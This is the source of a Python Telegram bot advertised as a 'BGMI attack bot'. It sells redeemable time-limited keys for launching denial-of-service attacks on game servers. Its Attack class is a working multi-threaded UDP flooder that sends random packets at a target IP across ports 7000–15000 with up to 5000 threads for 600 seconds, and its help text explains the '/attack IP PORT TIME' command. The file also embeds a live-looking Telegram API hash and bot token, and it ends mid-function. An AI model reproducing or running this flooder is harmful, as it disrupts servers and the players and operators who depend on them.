#!/usr/bin/env python3
"""
💎 PREMIUM BGMI ATTACK BOT - ULTRA PRO
SERVER FREEZE BOT | ALL WORKING FIXED
"""

import asyncio, json, random, os, time, socket, threading, logging, string, uuid
from datetime import datetime, timedelta
import pytz
from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import FloodWait

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ═══════════════ CONFIG ═══════════════
API_ID = 35140329
API_HASH = "011f638e4acadee178c59afffc80193d"
BOT_TOKEN = "8771905727:AAEJq2QVVSe8OxZOqLkatVK1wGysO9UyzCQ"
OWNER_ID = 1987818347
OWNER_USERNAME = "FathersOfCreater"
OWNER_LINK = f"https://t.me/{OWNER_USERNAME}"
BOT_USERNAME = "BeStChEaT_BGMIDdos_Bot"
BOT_LINK = f"https://t.me/{BOT_USERNAME}"

# ═══════════════ DATABASE ═══════════════
VIDEO_DB = "videos.json"
USERS_DB = "users.json"
KEYS_DB = "keys.json"
BLOCKED_DB = "blocked.json"
HISTORY_DB = "history.json"
STICKER_DB = "sticker.json"
EMOJI_DB = "emojis.json"
STICKER_TIME_DB = "sticker_times.json"
SETTINGS_DB = "settings.json"
STOP_STICKER_DB = "stop_sticker.json"

IST = pytz.timezone('Asia/Kolkata')
LINE = "━━━━━━━━━━━━━━━━━━━"

# ═══════════════ SETTINGS ═══════════════
PREMIUM_THREADS = 5000
PREMIUM_TIME = 600
DEFAULT_STICKER_TIME = 5
DEFAULT_VIDEO_DELAY = 3

# ═══════════════ TRACKING ═══════════════
used_videos = []
last_emoji_index = -1
last_sticker_index = -1
last_video_index = -1

# ═══════════════ HELPERS ═══════════════
def jload(f, d=None):
    try:
        if os.path.exists(f):
            with open(f) as fl: return json.load(fl)
    except: pass
    return d if d is not None else {}

def jsave(f, d):
    with open(f, 'w') as fl: json.dump(d, fl, indent=2)

def generate_unique_key():
    prefixes = ["BGMI", "VIP", "PRO", "ELITE", "LEGEND", "MYTHIC", "ULTRA"]
    prefix = random.choice(prefixes)
    seg1 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    seg2 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    unique_id = str(uuid.uuid4())[:8].upper()
    return f"{prefix}-{seg1}-{seg2}-{unique_id}"

def parse_duration(time_str):
    if not time_str: return None
    time_str = time_str.lower().strip()
    try:
        if 'min' in time_str: return int(time_str.replace('min','').replace('mins','').strip()), 'minutes'
        elif time_str.endswith('m'): return int(time_str[:-1]), 'minutes'
        elif 'h' in time_str: return int(time_str.replace('h','').replace('hr','').replace('hrs','').replace('hour','').replace('hours','').strip()), 'hours'
        elif 'd' in time_str: return int(time_str.replace('d','').replace('day','').replace('days','').strip()), 'days'
        elif 'w' in time_str: return int(time_str.replace('w','').replace('wk','').replace('wks','').replace('week','').replace('weeks','').strip()), 'weeks'
        elif 'mo' in time_str: return int(time_str.replace('mo','').replace('month','').replace('months','').strip()), 'months'
        else: return int(time_str), 'hours'
    except: return None

def calc_expiry(value, unit):
    now = datetime.now(IST)
    if unit == 'minutes': return now + timedelta(minutes=value)
    elif unit == 'hours': return now + timedelta(hours=value)
    elif unit == 'days': return now + timedelta(days=value)
    elif unit == 'weeks': return now + timedelta(weeks=value)
    elif unit == 'months': return now + timedelta(days=value*30)
    return now + timedelta(hours=value)

def format_duration(value, unit):
    names = {'minutes':'Minute','hours':'Hour','days':'Day','weeks':'Week','months':'Month'}
    name = names.get(unit, unit)
    return f"{value} {name}{'s' if value != 1 else ''}"

def get_remaining(expiry_str):
    try:
        expiry = datetime.fromisoformat(expiry_str)
        now = datetime.now(IST)
        if now >= expiry: return "EXPIRED", True
        diff = expiry - now
        days = diff.days
        hours = diff.seconds // 3600
        minutes = (diff.seconds % 3600) // 60
        seconds = diff.seconds % 60
        if days > 30: return f"{days//30}M+", False
        elif days > 0: return f"{days}D {hours}H {minutes}M", False
        elif hours > 0: return f"{hours}H {minutes}M {seconds}S", False
        elif minutes > 0: return f"{minutes}M {seconds}S", False
        else: return f"{seconds}S", False
    except: return "ERROR", False

# ═══════════════ SETTINGS FUNCTIONS ═══════════════
def get_settings():
    return jload(SETTINGS_DB, {"sticker_time": DEFAULT_STICKER_TIME, "video_delay": DEFAULT_VIDEO_DELAY})

def save_settings(sticker_time=None, video_delay=None):
    settings = get_settings()
    if sticker_time is not None:
        settings["sticker_time"] = sticker_time
    if video_delay is not None:
        settings["video_delay"] = video_delay
    jsave(SETTINGS_DB, settings)
    return settings

def get_sticker_display_time():
    settings = get_settings()
    return settings.get("sticker_time", DEFAULT_STICKER_TIME)

def get_video_delay_time():
    settings = get_settings()
    return settings.get("video_delay", DEFAULT_VIDEO_DELAY)

# ═══════════════ STOP STICKER FUNCTIONS ═══════════════
def get_stop_sticker():
    data = jload(STOP_STICKER_DB, {"sticker_id": None})
    return data.get("sticker_id")

def set_stop_sticker(sticker_id):
    jsave(STOP_STICKER_DB, {"sticker_id": sticker_id})
    return True

def clear_stop_sticker():
    jsave(STOP_STICKER_DB, {"sticker_id": None})
    return True

# ═══════════════ STICKER TIME FUNCTIONS ═══════════════
def get_sticker_times():
    return jload(STICKER_TIME_DB, {})

def save_sticker_time(sticker_id, duration):
    data = get_sticker_times()
    data[sticker_id] = duration
    jsave(STICKER_TIME_DB, data)
    return True

def get_sticker_time(sticker_id):
    data = get_sticker_times()
    return data.get(sticker_id, get_sticker_display_time())

def set_all_sticker_times(duration):
    stickers = get_all_stickers()
    if not stickers:
        return False, 0
    data = get_sticker_times()
    for sticker_id in stickers:
        data[sticker_id] = duration
    jsave(STICKER_TIME_DB, data)
    return True, len(stickers)

# ═══════════════ EMOJI FUNCTIONS ═══════════════
def get_emojis():
    data = jload(EMOJI_DB, {"emojis": []})
    return data

def add_emoji(emoji_id):
    data = get_emojis()
    if emoji_id not in data["emojis"]:
        data["emojis"].append(emoji_id)
        jsave(EMOJI_DB, data)
        return True, len(data["emojis"])
    return False, len(data["emojis"])

def remove_emoji(index):
    data = get_emojis()
    if 0 <= index < len(data["emojis"]):
        removed = data["emojis"].pop(index)
        jsave(EMOJI_DB, data)
        return True, removed, len(data["emojis"])
    return False, None, len(data["emojis"])

def get_random_emoji():
    global last_emoji_index
    data = get_emojis()
    if data["emojis"]:
        if len(data["emojis"]) > 1:
            available = [i for i in range(len(data["emojis"])) if i != last_emoji_index]
            if available:
                last_emoji_index = random.choice(available)
                return data["emojis"][last_emoji_index]
        last_emoji_index = 0
        return data["emojis"][0]
    return None

def get_all_emojis():
    return get_emojis()["emojis"]

def reset_emojis():
    jsave(EMOJI_DB, {"emojis": []})
    return True

# ═══════════════ STICKER FUNCTIONS ═══════════════
def get_stickers():
    data = jload(STICKER_DB, {"stickers": []})
    return data

def add_sticker(sticker_id, duration=None):
    data = get_stickers()
    if sticker_id not in data["stickers"]:
        data["stickers"].append(sticker_id)
        jsave(STICKER_DB, data)
        if duration:
            save_sticker_time(sticker_id, duration)
        return True, len(data["stickers"])
    return False, len(data["stickers"])

def remove_sticker(index):
    data = get_stickers()
    if 0 <= index < len(data["stickers"]):
        removed = data["stickers"].pop(index)
        jsave(STICKER_DB, data)
        return True, removed, len(data["stickers"])
    return False, None, len(data["stickers"])

def get_random_sticker():
    global last_sticker_index
    data = get_stickers()
    if data["stickers"]:
        if len(data["stickers"]) > 1:
            available = [i for i in range(len(data["stickers"])) if i != last_sticker_index]
            if available:
                last_sticker_index = random.choice(available)
                return data["stickers"][last_sticker_index]
        last_sticker_index = 0
        return data["stickers"][0]
    return None

def get_all_stickers():
    return get_stickers()["stickers"]

def reset_stickers():
    jsave(STICKER_DB, {"stickers": []})
    jsave(STICKER_TIME_DB, {})
    return True

# ═══════════════ VIDEO FUNCTIONS ═══════════════
def get_vids(): return jload(VIDEO_DB, [])
def add_vid(path):
    vids = get_vids()
    vid = len(vids) + 1
    vids.append({"id": vid, "path": path, "name": os.path.basename(path)})
    jsave(VIDEO_DB, vids)
    return vid

def rand_vid():
    global last_video_index
    vids = get_vids()
    if not vids:
        return None
    if len(vids) > 1:
        available = [v for v in vids if v["id"] != last_video_index]
        if available:
            chosen = random.choice(available)
            last_video_index = chosen["id"]
            return chosen
    chosen = random.choice(vids)
    last_video_index = chosen["id"]
    return chosen

def del_vid(vid):
    vids = get_vids()
    for i, v in enumerate(vids):
        if v["id"] == vid:
            if os.path.exists(v["path"]): os.remove(v["path"])
            vids.pop(i); jsave(VIDEO_DB, vids)
            return True
    return False

def clear_vids():
    vids = get_vids()
    for v in vids:
        if os.path.exists(v["path"]): os.remove(v["path"])
    jsave(VIDEO_DB, [])
    return len(vids)

# ═══════════════ USER FUNCTIONS ═══════════════
def get_users(): return jload(USERS_DB, {"premium": [], "keys": {}})
def get_blocked(): return jload(BLOCKED_DB, [])
def is_blocked(uid): return str(uid) in get_blocked()

def check_access(uid):
    if is_blocked(uid): return False, "BLOCKED"
    if uid == OWNER_ID: return True, "OWNER"
    u = get_users()
    if str(uid) in u.get("premium", []): return True, "PREMIUM"
    uk = u.get("keys", {}).get(str(uid), {})
    if uk:
        try:
            if datetime.now(IST) < datetime.fromisoformat(uk["expiry"]):
                r, _ = get_remaining(uk["expiry"])
                return True, f"KEY ({r})"
            else:
                del u["keys"][str(uid)]; jsave(USERS_DB, u)
        except: pass
    return False, "NONE"

def get_user_info(uid):
    access, a_type = check_access(uid)
    info = {"access": access, "type": a_type, "threads": PREMIUM_THREADS if access else 0, "max_time": PREMIUM_TIME if access else 0, "expiry": None, "remaining": None}
    if a_type.startswith("KEY"):
        uk = get_users().get("keys", {}).get(str(uid), {})
        if uk:
            info["expiry"] = uk.get("expiry")
            if info["expiry"]: info["remaining"], _ = get_remaining(info["expiry"])
    return info

def grant_access(uid, key_name, duration_str, expiry):
    u = get_users()
    if "keys" not in u: u["keys"] = {}
    u["keys"][str(uid)] = {"key_name": key_name, "duration": duration_str, "expiry": expiry.isoformat(), "granted_at": datetime.now(IST).isoformat()}
    jsave(USERS_DB, u)

def remove_expired():
    u = get_users(); removed = 0
    if "keys" in u:
        exp = [uid for uid, data in u["keys"].items() if datetime.now(IST) >= datetime.fromisoformat(data["expiry"])]
        for uid in exp: del u["keys"][uid]; removed += 1
        if removed > 0: jsave(USERS_DB, u)
    return removed

# ═══════════════ HISTORY ═══════════════
def get_history(): return jload(HISTORY_DB, {})
def add_history(uid, action, details):
    h = get_history()
    if str(uid) not in h: h[str(uid)] = []
    h[str(uid)].append({"action": action, "details": details, "time": datetime.now(IST).isoformat()})
    if len(h[str(uid)]) > 50: h[str(uid)] = h[str(uid)][-50:]
    jsave(HISTORY_DB, h)

def get_user_history(uid):
    return get_history().get(str(uid), [])

# ═══════════════ KEY FUNCTIONS ═══════════════
def get_keys(): return jload(KEYS_DB, {})
def create_key(name, time_str):
    keys = get_keys()
    key_code = generate_unique_key()
    while key_code in keys: key_code = generate_unique_key()
    parsed = parse_duration(time_str)
    if not parsed: return None, None
    value, unit = parsed
    keys[key_code] = {"name": name, "time_value": value, "time_unit": unit, "duration_display": format_duration(value, unit), "created": datetime.now(IST).isoformat(), "used_by": None, "active": True}
    jsave(KEYS_DB, keys)
    return key_code, format_duration(value, unit)

def redeem_key_code(key_code, user_id):
    keys = get_keys()
    if key_code not in keys: return False, "Invalid key!"
    key = keys[key_code]
    if not key["active"]: return False, "Key already used!"
    expiry = calc_expiry(key["time_value"], key["time_unit"])
    grant_access(user_id, key["name"], key["duration_display"], expiry)
    key["used_by"] = str(user_id); key["used_at"] = datetime.now(IST).isoformat(); key["active"] = False
    jsave(KEYS_DB, keys)
    add_history(user_id, "KEY_REDEEMED", f"{key['duration_display']}")
    return True, expiry.strftime('%d %B %Y, %I:%M %p')

# ═══════════════ ATTACK ENGINE ═══════════════
class Attack:
    def __init__(self):
        self.on = False; self.pkts = 0; self.bytes_out = 0; self.lock = threading.Lock()
    def flood(self, ip, port, end):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        s.settimeout(0.001)
        ports = list(range(7000, 15000)) + [17500, 20000, 27000]
        while self.on and time.time() < end:
            try:
                for _ in range(20):
                    if not self.on: break
                    p = random.randbytes(random.randint(500, 1500))
                    s.sendto(p, (ip, random.choice(ports)))
                    with self.lock: self.pkts += 1; self.bytes_out += len(p)
            except: pass
        s.close()
    def start(self, ip, port, dur, threads):
        self.on = True; self.pkts = 0; self.bytes_out = 0
        end = time.time() + dur
        workers = [threading.Thread(target=self.flood, args=(ip, port, end)) for _ in range(threads)]
        for w in workers: w.daemon = True; w.start()
        time.sleep(dur); self.on = False
        e = max(dur, 0.1)
        return {'pkts': self.pkts, 'mbps': (self.bytes_out*8)/(e*1e6), 'mb': self.bytes_out/1024/1024}

attacker = Attack()
attacking = False
ainfo = {}
amsg = None
attack_user = None

# ═══════════════ BOT ═══════════════
app = Client("final_bgmi_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ═══════════════ STYLISH TEXT HELPERS ═══════════════
def style1_smallcaps(text):
    chars = {
        'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ',
        'j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ',
        's':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ',
        'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ',
        'J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ',
        'S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style2_greek(text):
    chars = {
        'a':'α','b':'в','c':'¢','d':'∂','e':'є','f':'f','g':'g','h':'н','i':'ι',
        'j':'נ','k':'κ','l':'ℓ','m':'м','n':'η','o':'σ','p':'ρ','q':'q','r':'я',
        's':'ѕ','t':'т','u':'υ','v':'ν','w':'ω','x':'χ','y':'γ','z':'z',
        'A':'α','B':'в','C':'¢','D':'∂','E':'є','F':'f','G':'g','H':'н','I':'ι',
        'J':'נ','K':'κ','L':'ℓ','M':'м','N':'η','O':'σ','P':'ρ','Q':'q','R':'я',
        'S':'ѕ','T':'т','U':'υ','V':'ν','W':'ω','X':'χ','Y':'γ','Z':'z'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style3_bolditalic(text):
    chars = {
        'a':'𝒂','b':'𝒃','c':'𝒄','d':'𝒅','e':'𝒆','f':'𝒇','g':'𝒈','h':'𝒉','i':'𝒊',
        'j':'𝒋','k':'𝒌','l':'𝒍','m':'𝒎','n':'𝒏','o':'𝒐','p':'𝒑','q':'𝒒','r':'𝒓',
        's':'𝒔','t':'𝒕','u':'𝒖','v':'𝒗','w':'𝒘','x':'𝒙','y':'𝒚','z':'𝒛',
        'A':'𝑨','B':'𝑩','C':'𝑪','D':'𝑫','E':'𝑬','F':'𝑭','G':'𝑮','H':'𝑯','I':'𝑰',
        'J':'𝑱','K':'𝑲','L':'𝑳','M':'𝑴','N':'𝑵','O':'𝑶','P':'𝑷','Q':'𝑸','R':'𝑹',
        'S':'𝑺','T':'𝑻','U':'𝑼','V':'𝑽','W':'𝑾','X':'𝑿','Y':'𝒀','Z':'𝒁'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style4_script(text):
    chars = {
        'a':'𝓪','b':'𝓫','c':'𝓬','d':'𝓭','e':'𝓮','f':'𝓯','g':'𝓰','h':'𝓱','i':'𝓲',
        'j':'𝓳','k':'𝓴','l':'𝓵','m':'𝓶','n':'𝓷','o':'𝓸','p':'𝓹','q':'𝓺','r':'𝓻',
        's':'𝓼','t':'𝓽','u':'𝓾','v':'𝓿','w':'𝔀','x':'𝔁','y':'𝔂','z':'𝔃',
        'A':'𝓐','B':'𝓑','C':'𝓒','D':'𝓓','E':'𝓔','F':'𝓕','G':'𝓖','H':'𝓗','I':'𝓘',
        'J':'𝓙','K':'𝓚','L':'𝓛','M':'𝓜','N':'𝓝','O':'𝓞','P':'𝓟','Q':'𝓠','R':'𝓡',
        'S':'𝓢','T':'𝓣','U':'𝓤','V':'𝓥','W':'𝓦','X':'𝓧','Y':'𝓨','Z':'𝓩'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style5_bold(text):
    chars = {
        'a':'𝐚','b':'𝐛','c':'𝐜','d':'𝐝','e':'𝐞','f':'𝐟','g':'𝐠','h':'𝐡','i':'𝐢',
        'j':'𝐣','k':'𝐤','l':'𝐥','m':'𝐦','n':'𝐧','o':'𝐨','p':'𝐩','q':'𝐪','r':'𝐫',
        's':'𝐬','t':'𝐭','u':'𝐮','v':'𝐯','w':'𝐰','x':'𝐱','y':'𝐲','z':'𝐳',
        'A':'𝐀','B':'𝐁','C':'𝐂','D':'𝐃','E':'𝐄','F':'𝐅','G':'𝐆','H':'𝐇','I':'𝐈',
        'J':'𝐉','K':'𝐊','L':'𝐋','M':'𝐌','N':'𝐍','O':'𝐎','P':'𝐏','Q':'𝐐','R':'𝐑',
        'S':'𝐒','T':'𝐓','U':'𝐔','V':'𝐕','W':'𝐖','X':'𝐗','Y':'𝐘','Z':'𝐙'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def premium_text(text, style_num=1):
    styles = {
        1: style1_smallcaps,
        2: style2_greek,
        3: style3_bolditalic,
        4: style4_script,
        5: style5_bold
    }
    styled = styles.get(style_num, style1_smallcaps)(text)
    return f"˹{styled}˼"

# ═══════════════ BUTTONS ═══════════════
def main_menu_kb(is_owner=False):
    if is_owner:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton(f"⚔ {premium_text('ATTACK', 2)}", callback_data="attack_menu"),
             InlineKeyboardButton(f"⛔ {premium_text('STOP', 1)}", callback_data="stop_attack")],
            [InlineKeyboardButton(f"▓ {premium_text('STATUS', 3)}", callback_data="status_btn"),
             InlineKeyboardButton(f"ⓘ {premium_text('INFO', 4)}", callback_data="info_menu")],
            [InlineKeyboardButton(f"⚿ {premium_text('REDEEM KEY', 5)}", callback_data="redeem_menu")],
            [InlineKeyboardButton(f"⌨ {premium_text('COMMANDS', 1)}", callback_data="commands_menu")],
            [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
            [InlineKeyboardButton(f"▶ {premium_text('VIDEO MANAGER', 3)}", callback_data="video_menu")],
            [InlineKeyboardButton(f"★ {premium_text('EMOJI MANAGER', 4)}", callback_data="emoji_menu")],
            [InlineKeyboardButton(f"❄ {premium_text('STICKER MANAGER', 1)}", callback_data="sticker_menu")],
            [InlineKeyboardButton(f"⚜ {premium_text('ADMIN PANEL', 5)}", callback_data="admin_menu")]
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton(f"⚔ {premium_text('ATTACK', 2)}", callback_data="attack_menu"),
             InlineKeyboardButton(f"⛔ {premium_text('STOP', 1)}", callback_data="stop_attack")],
            [InlineKeyboardButton(f"▓ {premium_text('STATUS', 3)}", callback_data="status_btn"),
             InlineKeyboardButton(f"ⓘ {premium_text('INFO', 4)}", callback_data="info_menu")],
            [InlineKeyboardButton(f"⚿ {premium_text('REDEEM KEY', 5)}", callback_data="redeem_menu")],
            [InlineKeyboardButton(f"⌨ {premium_text('COMMANDS', 1)}", callback_data="commands_menu")]
        ])

def back_to_menu_kb(is_owner=False):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⚿ {premium_text('ADD KEY', 2)}", callback_data="admin_addkey")],
        [InlineKeyboardButton(f"⚜ {premium_text('AUTO GEN KEY', 3)}", callback_data="admin_auto")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌘ {premium_text('ALL KEYS', 4)}", callback_data="admin_keys")],
        [InlineKeyboardButton(f"⎙ {premium_text('STATS', 5)}", callback_data="admin_stats")],
        [InlineKeyboardButton(f"↺ {premium_text('CLEAR EXPIRED', 1)}", callback_data="admin_clear")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

def video_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⎘ {premium_text('ADD VIDEO', 3)}", callback_data="v_add")],
        [InlineKeyboardButton(f"⌫ {premium_text('DELETE VIDEO', 4)}", callback_data="v_del")],
        [InlineKeyboardButton(f"⎚ {premium_text('CLEAR ALL', 5)}", callback_data="v_clear")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌘ {premium_text('LIST VIDEOS', 1)}", callback_data="v_list")],
        [InlineKeyboardButton(f"❓ {premium_text('HELP', 2)}", callback_data="v_help")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

def emoji_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⎘ {premium_text('ADD EMOJI', 4)}", callback_data="e_add")],
        [InlineKeyboardButton(f"⌫ {premium_text('REMOVE EMOJI', 5)}", callback_data="e_remove")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌘ {premium_text('LIST EMOJIS', 1)}", callback_data="e_list")],
        [InlineKeyboardButton(f"↺ {premium_text('RESET ALL', 2)}", callback_data="e_reset")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

def sticker_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⎘ {premium_text('ADD STICKER', 3)}", callback_data="s_add")],
        [InlineKeyboardButton(f"⌫ {premium_text('REMOVE STICKER', 4)}", callback_data="s_remove")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌘ {premium_text('LIST STICKERS', 5)}", callback_data="s_list")],
        [InlineKeyboardButton(f"↺ {premium_text('RESET ALL', 1)}", callback_data="s_reset")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

def auto_key_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⏱ {premium_text('20 MINUTE', 1)}", callback_data="ak_20m"),
         InlineKeyboardButton(f"⏱ {premium_text('40 MINUTE', 2)}", callback_data="ak_40m"),
         InlineKeyboardButton(f"⏱ {premium_text('60 MINUTE', 3)}", callback_data="ak_60m")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌚ {premium_text('1 DAY', 4)}", callback_data="ak_1d"),
         InlineKeyboardButton(f"⌚ {premium_text('3 DAY', 5)}", callback_data="ak_3d"),
         InlineKeyboardButton(f"⌚ {premium_text('7 DAY', 1)}", callback_data="ak_7d")],
        [InlineKeyboardButton(f"⌚ {premium_text('15 DAY', 2)}", callback_data="ak_15d"),
         InlineKeyboardButton(f"⌚ {premium_text('23 DAY', 3)}", callback_data="ak_23d"),
         InlineKeyboardButton(f"⌚ {premium_text('30 DAY', 4)}", callback_data="ak_30d")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⎚ {premium_text('1 MONTH', 5)}", callback_data="ak_1mo"),
         InlineKeyboardButton(f"⎚ {premium_text('2 MONTH', 1)}", callback_data="ak_2mo"),
         InlineKeyboardButton(f"⎚ {premium_text('3 MONTH', 2)}", callback_data="ak_3mo")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton(f"⌂ {premium_text('MAIN MENU', 5)}", callback_data="menu")]
    ])

# ═══════════════ COMMANDS LIST ═══════════════
def get_commands_list(is_owner=False):
    user_commands = f"""
╔══════════════════════════════════════╗
║         ⌨ {premium_text('COMMANDS LIST', 5)}          ║
╚══════════════════════════════════════╝

╔══════════════════════════════════════╗
║      👤 {premium_text('USER COMMANDS', 4)}            ║
╚══════════════════════════════════════╝

/start - ✨ {premium_text('BOT START KAREIN', 1)}
/attack - ⚔ {premium_text('ATTACK START KAREIN', 2)}  
/stop - ⛔ {premium_text('ATTACK STOP KAREIN', 3)}
/redeem - ⚿ {premium_text('KEY REDEEM KAREIN', 4)}
/status - 📊 {premium_text('STATUS CHECK KAREIN', 5)}
/commands - 📝 {premium_text('COMMANDS DEKHEIN', 1)}

╔══════════════════════════════════════╗
║      🎯 {premium_text('ATTACK HELP', 2)}              ║
╚══════════════════════════════════════╝

{premium_text('Format:', 5)} /attack IP PORT TIME
{premium_text('Example:', 5)} /attack 1.2.3.4 8080 600
{premium_text('BGMI Ports:', 5)} 7000 - 15000
{premium_text('Max Time:', 5)} 600 {premium_text('Seconds', 1)} (10 {premium_text('Minutes', 1)})

╔══════════════════════════════════════╗
║      🔑 {premium_text('REDEEM HELP', 3)}              ║
╚══════════════════════════════════════╝

{premium_text('Format:', 5)} /redeem KEY_CODE
{premium_text('Example:', 5)} /redeem BGMI-XXXX-XXXX-XXXX

╔══════════════════════════════════════╗
║      ⏱ {premium_text('DURATIONS', 1)}                 ║
╚══════════════════════════════════════╝

{premium_text('30m', 2)} - 30 {premium_text('Minutes', 1)}
{premium_text('1h', 3)} - 1 {premium_text('Hour', 1)}
{premium_text('24h', 4)} - 24 {premium_text('Hours', 1)}
{premium_text('7d', 5)} - 7 {premium_text('Days', 1)}
{premium_text('2w', 1)} - 2 {premium_text('Weeks', 1)}
{premium_text('1mo', 2)} - 1 {premium_text('Month', 1)}
{premium_text('3mo', 3)} - 3 {premium_text('Months', 1)}

"""
    
    owner_commands = f"""
╔══════════════════════════════════════╗
║      ⚜ {premium_text('OWNER COMMANDS', 5)}            ║
╚══════════════════════════════════════╝

🎨 {premium_text('STICKER COMMANDS', 4)}
/addsticker - ⎘ {premium_text('STICKER ADD KAREIN', 1)}
/removesticker - ⌫ {premium_text('STICKER REMOVE KAREIN', 2)}
/liststickers - ⌘ {premium_text('STICKERS DEKHEIN', 3)}
/resetstickers - ↺ {premium_text('STICKERS RESET KAREIN', 4)}
/setstickertime - ⏱ {premium_text('SINGLE STICKER TIME SET', 5)}
/setallstickertime - ⏱ {premium_text('ALL STICKERS TIME SET', 1)}

⛔ {premium_text('STOP STICKER COMMANDS', 5)}
/addstop - ⎘ {premium_text('STOP STICKER ADD KAREIN', 3)}
/removestop - ⌫ {premium_text('STOP STICKER REMOVE KAREIN', 4)}

🎯 {premium_text('EMOJI COMMANDS', 2)}
/addemoji - ⎘ {premium_text('EMOJI ADD KAREIN', 3)}
/removeemoji - ⌫ {premium_text('EMOJI REMOVE KAREIN', 4)}
/listemojis - ⌘ {premium_text('EMOJIS DEKHEIN', 5)}
/resetemojis - ↺ {premium_text('EMOJIS RESET KAREIN', 1)}

🎬 {premium_text('VIDEO COMMANDS', 3)}
/addvideo - ⎘ {premium_text('VIDEO ADD KAREIN', 4)}
/delvideo - ⌫ {premium_text('VIDEO DELETE KAREIN', 5)}
/videos - ⌘ {premium_text('VIDEOS DEKHEIN', 1)}
/clearvideos - ⎚ {premium_text('VIDEOS CLEAR KAREIN', 2)}
/setvideodelay - ⏱ {premium_text('VIDEO DELAY SET KAREIN', 3)}

🔑 {premium_text('KEY COMMANDS', 4)}
/genkey - ⚿ {premium_text('KEY GENERATE KAREIN', 5)}
/admin_keys - ⌘ {premium_text('ALL KEYS DEKHEIN', 1)}
/admin_stats - ⎙ {premium_text('STATISTICS DEKHEIN', 2)}
/admin_clear - ↺ {premium_text('EXPIRED CLEAR KAREIN', 3)}

⚙️ {premium_text('SETTINGS COMMANDS', 3)}
/settings - ⚙️ {premium_text('SHOW SETTINGS', 4)}

╔══════════════════════════════════════╗
║      📲 {premium_text('CONTACT', 5)}                   ║
╚══════════════════════════════════════╝

⚜ {premium_text('Owner:', 5)} {premium_text('FATHER OF BOT', 4)}
🤖 {premium_text('Bot:', 5)} @BeStChEaT_BGMIDdos_Bot

"""
    
    if is_owner:
        return user_commands + owner_commands
    return user_commands

# ═══════════════ WELCOME ANIMATION ═══════════════
async def welcome_animation(client, msg):
    try:
        user = msg.from_user
        chat_id = msg.chat.id
        first_name = user.first_name or "User"
